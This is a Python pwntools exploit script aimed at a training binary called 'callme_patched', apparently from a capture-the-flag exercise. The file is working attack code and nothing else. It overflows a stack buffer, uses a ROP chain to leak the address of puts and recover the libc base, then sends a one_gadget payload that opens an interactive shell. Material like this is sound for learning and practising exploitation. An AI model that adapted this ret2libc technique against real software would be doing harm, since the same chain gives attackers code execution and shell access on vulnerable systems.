#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

exe = "./callme_patched"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
if args.GDB: gdb.attach(io, "b *main")

offset  = 40
pop_rdi = 0x00000000004009a3
ret     = 0x00000000004006be

payload = flat(
	cyclic(offset, n=8),
	pop_rdi,
	elf.got.puts,
	ret,
	elf.plt.puts,
	ret,
	elf.sym.main
)
io.sendlineafter(b"> ", payload)

io.recvuntil(b"Thank you!\n")
puts = fixleak(io.recvline())

info("puts @ %#x" % puts)
libc.address = puts - libc.sym.puts
info("base @ %#x" % libc.address)

one_gadget = libc.address + 0xe3b01
payload = flat(
	cyclic(offset, n=8),
	one_gadget
)
io.sendlineafter(b"> ", payload)

io.interactive()
